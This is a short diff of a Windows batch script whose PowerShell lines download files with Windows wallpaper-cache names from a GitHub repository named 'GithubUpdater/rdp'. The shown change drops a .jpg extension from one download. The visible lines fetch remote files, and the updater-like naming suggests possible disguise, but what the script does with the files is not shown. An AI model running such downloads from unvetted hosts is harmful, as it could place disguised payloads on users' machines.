@@ -1,5 +1,5 @@
 @echo off
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/GithubUpdater/rdp/main/TranscodedWallpaper.jpg -OutFile TranscodedWallpaper"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/GithubUpdater/rdp/main/TranscodedWallpaper -OutFile TranscodedWallpaper"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/GithubUpdater/rdp/main/CachedImage_1024_768_POS4.jpg -OutFile CachedImage_1024_768_POS4.jpg"
 
 set "TranscodedWallpaper=TranscodedWallpaper"
